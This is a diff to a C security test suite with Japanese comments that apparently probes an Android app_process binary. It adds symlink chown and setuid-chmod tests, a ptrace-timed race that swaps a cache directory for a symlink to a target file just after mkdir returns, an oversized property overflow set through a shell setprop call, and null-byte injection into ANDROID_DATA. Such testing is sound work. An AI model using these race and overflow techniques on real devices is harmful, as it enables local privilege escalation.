@@ -13,7 +13,11 @@
 #include <time.h>
 #include "tests.h"
 
-// ========== 既存テスト (1-5) は前回と同様 (軽微な修正) ==========
+#ifndef NT_PRSTATUS
+#define NT_PRSTATUS 1
+#endif
+
+// ========== 既存テスト (1-5) ==========
 void test_symlink_chown(const char *app_path) {
     printf("\n[TEST-1] シンボリックリンク chown 攻撃\n");
     setup_test_environment();
@@ -142,12 +146,10 @@ void test_toctou_race(const char *app_path) {
 
 // ========== 拡張テスト (6-9) ==========
 
-/* テスト6: chmod で setuid ビットを維持できるか */
 void test_chmod_setuid(const char *app_path) {
     printf("\n[TEST-6] chmod による Setuid ビット維持攻撃\n");
     setup_test_environment();
 
-    // ターゲットファイルに setuid ビットを事前付与
     if (chmod(TARGET_FILE, 04777) != 0) {
         perror("chmod pre-set");
         cleanup_test_environment();
@@ -175,7 +177,6 @@ void test_chmod_setuid(const char *app_path) {
     cleanup_test_environment();
 }
 
-/* テスト7: ptrace を利用した確実な TOCTOU */
 static int wait_for_syscall(pid_t pid) {
     int status;
     while (1) {
@@ -192,7 +193,6 @@ void test_ptrace_toctou(const char *app_path) {
     printf("\n[TEST-7] ptrace 利用確実 TOCTOU\n");
     setup_test_environment();
 
-    // 事前に実ディレクトリを作成 (mkdir 成功させる)
     char real_cache[PATH_MAX];
     snprintf(real_cache, sizeof(real_cache), "%s/real_cache", TEST_DIR);
     mkdir(real_cache, 0755);
@@ -201,7 +201,6 @@ void test_ptrace_toctou(const char *app_path) {
 
     pid_t pid = fork();
     if (pid == 0) {
-        // 子: トレース対象
         ptrace(PTRACE_TRACEME, 0, 0, 0);
         char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
         char *argv[] = { (char*)app_path, "--zygote", NULL };
@@ -209,7 +208,6 @@ void test_ptrace_toctou(const char *app_path) {
         perror("execve child");
         exit(1);
     } else if (pid > 0) {
-        // 親: トレーサー
         int status;
         waitpid(pid, &status, 0);
         ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
@@ -219,15 +217,16 @@ void test_ptrace_toctou(const char *app_path) {
             if (!wait_for_syscall(pid)) break;
 
             struct user_pt_regs regs;
-            ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &regs);
+            // NT_PRSTATUS (1) は Linux/Android 共通
+            if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &regs) == -1) {
+                perror("ptrace GETREGSET");
+                break;
+            }
 
-            // aarch64 syscall number: x8, mkdir = 83
-            if (regs.regs[8] == 83) {
+            if (regs.regs[8] == 83) { // __NR_mkdir = 83 on aarch64
                 if (!in_syscall) {
-                    // エントリ
                     in_syscall = 1;
                 } else {
-                    // リターン: この瞬間に symlink を差し替える
                     unlink(CACHE_DIR);
                     symlink(TARGET_FILE, CACHE_DIR);
                     printf("  [ptrace] mkdir リターン直後に symlink を差し替えました\n");
@@ -254,45 +253,49 @@ void test_ptrace_toctou(const char *app_path) {
     cleanup_test_environment();
 }
 
-/* テスト8: property_get バッファオーバーフロー (要 root で事前設定) */
 void test_property_overflow(const char *app_path) {
     printf("\n[TEST-8] property_get バッファオーバーフロー\n");
     setup_test_environment();
 
-    // 長大なプロパティ値を設定 (root 権限が必要なため、失敗しても無視)
     char long_prop[8192];
     memset(long_prop, 'B', sizeof(long_prop)-1);
     long_prop[sizeof(long_prop)-1] = '\0';
+
+    // setprop は root 権限が必要なため、失敗しても続行
     char set_cmd[10240];
     snprintf(set_cmd, sizeof(set_cmd), "setprop ro.product.cpu.abilist64 \"%s\"", long_prop);
     system(set_cmd);
 
+    char *arg_abi = malloc(strlen("--abi-list=") + strlen(long_prop) + 1);
+    if (!arg_abi) { perror("malloc"); cleanup_test_environment(); return; }
+    sprintf(arg_abi, "--abi-list=%s", long_prop);
+
     char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
-    char *argv[] = { (char*)app_path, "--abi-list=" long_prop, NULL };
+    char *argv[] = { (char*)app_path, arg_abi, NULL };
     printf("  ro.product.cpu.abilist64 を %zu バイトに設定しました。\n", strlen(long_prop));
     int ret = run_app_process(app_path, argv, envp);
     printf("  終了コード: %d (オーバーフローが発生した場合はクラッシュ)\n", ret);
+    free(arg_abi);
     cleanup_test_environment();
 }
 
-/* テスト9: ヌルバイトインジェクションによるパストラバーサル */
 void test_null_byte_injection(const char *app_path) {
     printf("\n[TEST-9] ヌルバイトインジェクション\n");
     setup_test_environment();
 
-    // ANDROID_DATA にヌルバイトを含める
-    // 例: /data/local/tmp\x00/target -> snprintf で /data/local/tmp として解釈される
-    char env_value[256];
-    snprintf(env_value, sizeof(env_value), "ANDROID_DATA=" TEST_DIR "\x00/target");
+    char env_value[512];
+    // 意図的にヌルバイトを埋め込む (snprintf で明示)
+    size_t pos = snprintf(env_value, sizeof(env_value), "ANDROID_DATA=" TEST_DIR);
+    env_value[pos] = '\0';  // ヌルバイト挿入
+    strcpy(env_value + pos + 1, "/target");
+
     char *envp[] = { env_value, NULL };
     char *argv[] = { (char*)app_path, "--zygote", NULL };
 
-    printf("  ANDROID_DATA にヌルバイトを埋め込み: %s\n", env_value);
+    printf("  ANDROID_DATA にヌルバイトを埋め込み (表示上は %s)\n", env_value);
     int ret = run_app_process(app_path, argv, envp);
     printf("  終了コード: %d (パスが途中で切られれば mkdir は別の場所で実行される)\n", ret);
 
-    // 想定: ヌルバイト以降は無視され、TEST_DIR で mkdir/chown が実行される。
-    // chown が /data/local/tmp の別のファイルに影響するか確認するため、所有者をチェック
     uid_t uid_after;
     if (check_file_owner(TARGET_FILE, &uid_after, NULL) == 0) {
         printf("  TARGET_FILE の現在の所有者: uid=%d\n", uid_after);
